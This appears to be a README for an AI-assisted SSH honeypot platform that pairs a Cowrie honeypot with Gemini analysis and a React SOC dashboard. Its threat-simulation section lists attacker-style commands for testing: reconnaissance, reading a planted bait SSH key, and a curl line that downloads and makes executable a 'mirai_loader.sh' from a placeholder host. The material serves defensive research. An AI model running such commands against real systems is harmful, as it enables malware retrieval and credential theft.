# Wraith AI — Autonomous Honeypot Analytics & Threat Intelligence Platform

> **A modern, AI-powered cyber deception ecosystem that captures, categorizes, and analyzes real-time attacker behavior across all threat vectors using Cowrie SSH Honeypot, Gemini 2.5 LLM, Supabase, and a React SOC Analytics Console.**

---

## 1. Executive Overview

**Wraith AI** is a universal, multi-vector threat capture and autonomous threat intelligence platform designed to trap, deflect, and analyze hostile cyber activities in real time. Unlike legacy static decoys or single-purpose traps, Wraith AI operates as a comprehensive deception fabric:
* **Universal Multi-Vector Capture**: Intercepts automated vulnerability scanners, brute-force bots, scripted credential stuffers, manual interactive shell reconnaissance, and targeted multi-stage exploitation attempts.
* **Autonomous AI Threat Intelligence**: Leverages **Google Gemini 2.5 Flash** to perform live behavioral decomposition, MITRE ATT&CK mapping, and automated threat severity scoring on captured shell sessions and command payloads.
* **Zero Production Risk**: Completely isolates threat actors within a realistic sandbox environment, neutralizing lateral movement while extracting high-fidelity Indicators of Compromise (IOCs) and Tactics, Techniques, and Procedures (TTPs).

---

## 2. Key Architecture & Features

### 🛡️ Universal SSH Deception Engine
Powered by an optimized Cowrie Honeypot layer exposed on ports `22` / `2222`. It emulates authentic Linux server environments, logging every TCP handshake, authentication attempt, keystroke, terminal command, downloaded payload, and session behavior without risking internal infrastructure.

### 🪤 High-Fidelity Canary Mesh Network
A matrix of decoy credential lures embedded throughout the system (e.g., AWS root credentials, OpenSSH bastion keys, Kubernetes admin configs, and database connection strings). Any unauthorized access to these bait assets generates an immediate `CRITICAL` severity alert with zero false positives.

### ⚡ Fast-Path & AI CTI Engine (`forwarder.py`)
A hybrid log forwarder and analysis pipeline:
* **Fast-Path Engine**: Instantly processes and indexes high-frequency authentication attempts and brute-force bursts (`T1110.001`).
* **AI Cognitive Engine**: Dispatches interactive shell sessions and complex terminal sequences to **Gemini 2.5 Flash** for natural-language behavioral summarization, threat level classification (`CRITICAL`, `HIGH`, `MEDIUM`, `LOW`), and automated MITRE ATT&CK technique mapping (`T1059.004`, `T1082`, `T1552.001`, etc.).

### 📊 Real-Time SOC Analytics Console
An enterprise-grade React dashboard providing:
* **Live Event Stream**: Real-time event feed with sub-second WebSocket updates.
* **Interactive Threat Map**: Global attacker origin telemetry and coordinate clustering.
* **Session Replay**: Interactive terminal playback engine to inspect adversary commands chronologically.
* **MITRE ATT&CK Matrix**: Dynamic coverage heat map visualizing observed adversary techniques.
* **Canary Mesh Status**: Real-time health, armed state, and trigger telemetry of planted deception tokens.

### 🗄️ Real-Time Persistence (Supabase)
Centralized PostgreSQL database managed through Supabase with enabled Realtime channels, enabling instant push notifications and synchronization across all active SOC analyst sessions.

---

## 3. System Architecture & Flow

```text
+-----------------------------------------------------------------------------------------+
|                                    ATTACK SURFACE                                       |
|  (Automated Scanners, Botnets, Exploits, Manual Reconnaissance, Credential Access)      |
+--------------------------------------------+--------------------------------------------+
                                             |
                                             | TCP Port 22 / 2222
                                             v
+-----------------------------------------------------------------------------------------+
|                               COWRIE HONEYPOT GATEWAY                                   |
|   - Terminal & Shell Emulation                                                          |
|   - Keystroke & Command Capture                                                         |
|   - Decoy Filesystem & Canary Mesh Tokens                                               |
|   - Emitted JSON Event Stream (cowrie.json)                                             |
+--------------------------------------------+--------------------------------------------+
                                             |
                                             | Tail Log Stream
                                             v
+-----------------------------------------------------------------------------------------+
|                         FORWARDER & COGNITIVE ENGINE (forwarder.py)                     |
|                                                                                         |
|      +------------------------------+       +------------------------------------+      |
|      |       Fast-Path Stream       |       |       Google Gemini 2.5 LLM        |      |
|      |   - Login & Auth Events      |       |   - Behavioral Analysis            |      |
|      |   - High-Frequency Events    |       |   - MITRE ATT&CK TTP Mapping       |      |
|      |   - Low Latency Ingestion    |       |   - Threat Level Classification    |      |
|      +--------------+---------------+       +-----------------+------------------+      |
+---------------------+-----------------------------------------+-------------------------+
                      |                                         |
                      +--------------------+--------------------+
                                           |
                                           | Ingest Payload & Analytics
                                           v
+-----------------------------------------------------------------------------------------+
|                               SUPABASE PERSISTENCE LAYER                                |
|   - PostgreSQL Database (`attack_logs` table)                                           |
|   - Realtime WebSocket Channels                                                         |
+--------------------------------------------+--------------------------------------------+
                                             |
                                             | Live WebSocket Stream
                                             v
+-----------------------------------------------------------------------------------------+
|                             WRAITH AI SOC ANALYTICS CONSOLE                             |
|   - React 19 + Vite + ECharts Dashboard                                                 |
|   - Live Event Feeds, Session Playback, Attack Map, Canary Grid & MITRE Matrix          |
+-----------------------------------------------------------------------------------------+
```

---

## 4. Tech Stack

| Domain | Technology / Library | Description |
|---|---|---|
| **Frontend Console** | **React 19, Vite, Tailwind CSS, Tabler Icons** | High-performance analyst dashboard with dark-mode SOC aesthetics. |
| **Data Visualizations** | **Apache ECharts, ECharts-for-React, TopoJSON** | Hardware-accelerated geographical attack maps and metrics. |
| **Analysis Engine** | **Python 3.11+, Google GenAI SDK (`gemini-2.5-flash`)** | Autonomous threat categorization and MITRE TTP extraction. |
| **Honeypot Infrastructure** | **Cowrie Honeypot, Linux `iptables`** | Medium/High-interaction SSH honeypot with port redirection. |
| **Database & Realtime** | **Supabase (PostgreSQL + Realtime Channel)** | Cloud-native relational storage with pub/sub event broadcasting. |

---

## 5. Prerequisites & Environment Setup

### A. Environment Configuration (`.env`)
Create a `.env` file in the root directory (and in the forwarder service folder) with your credentials:

```env
# Supabase Configuration
SUPABASE_URL=https://your-project-id.supabase.co
SUPABASE_KEY=your-supabase-service-role-or-anon-key

# Google Gemini API Key
GEMINI_API_KEY=your-google-gemini-api-key
```

---

### B. Honeypot & Forwarder Setup (Ubuntu Server)

```bash
# 1. Clone repository
git clone https://github.com/abokill/wraith-ai-platform.git
cd wraith-ai-platform

# 2. Configure Port Redirection (Route Port 22 to Cowrie Port 2222)
sudo iptables -t nat -A PREROUTING -p tcp --dport 22 -j REDIRECT --to-port 2222

# 3. Setup Python Virtual Environment
python3 -m venv venv
source venv/bin/activate
pip install -r services/api/requirements.txt google-genai supabase

# 4. Launch Autonomous Forwarder Service
python3 forwarder.py
```

---

### C. SOC Analytics Console Setup (React Dashboard)

```bash
# 1. Navigate to SOC Console directory
cd apps/soc-console

# 2. Install dependencies
npm install

# 3. Start local development server
npm run dev
```

The SOC console will be accessible at `http://localhost:5174` (or `http://127.0.0.1:5173`).

---

## 6. Database Schema (Supabase)

Execute the following SQL in your Supabase SQL Editor to initialize the `attack_logs` telemetry table:

```sql
CREATE TABLE IF NOT EXISTS public.attack_logs (
    id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
    session_id TEXT NOT NULL,
    src_ip TEXT NOT NULL,
    username TEXT,
    password TEXT,
    command TEXT,
    threat_level TEXT CHECK (threat_level IN ('CRITICAL', 'HIGH', 'MEDIUM', 'LOW', 'INFO')),
    attack_category TEXT,
    mitre_technique_id TEXT,
    summary_en TEXT,
    timestamp TIMESTAMPTZ DEFAULT timezone('utc'::text, now()) NOT NULL
);

-- Enable Realtime broadcasting
ALTER PUBLICATION supabase_realtime ADD TABLE public.attack_logs;

-- Indices for rapid query performance
CREATE INDEX IF NOT EXISTS idx_attack_logs_timestamp ON public.attack_logs (timestamp DESC);
CREATE INDEX IF NOT EXISTS idx_attack_logs_threat_level ON public.attack_logs (threat_level);
CREATE INDEX IF NOT EXISTS idx_attack_logs_src_ip ON public.attack_logs (src_ip);
```

---

## 7. Threat Simulation & Testing

To verify the platform's multi-vector capture capabilities, execute simulated attacks against the honeypot instance:

### 1. Interactive Authentication & Connection
```bash
ssh root@<HONEYPOT_IP> -p 2222
```

### 2. System Reconnaissance Simulation
```bash
# Check current privileges and kernel release
whoami && id && uname -a

# Inspect network configurations and active processes
ip a && ps aux
```

### 3. Canary Token Access Trigger (Bait Key Inspection)
```bash
# Triggers CRITICAL alert for T1552.001 (Unsecured Credentials)
cat /home/ubuntu/id_rsa_root_bastion_jumpbox
```

### 4. Malicious Dropper & Tool Fetch Simulation
```bash
# Simulates malware retrieval attempt
curl -O http://198.51.100.42/mirai_loader.sh && chmod +x mirai_loader.sh
```

All interactions will be streamed, analyzed by Gemini 2.5, stored in Supabase, and displayed on the **Wraith AI SOC Dashboard** in real time.

---

## 8. License & Ethical Disclaimer

This software is developed strictly for **authorized cybersecurity research, defensive threat modeling, and educational purposes**. Deployed honeypots must be maintained in an isolated sandbox environment. The authors assume no liability for misuse.
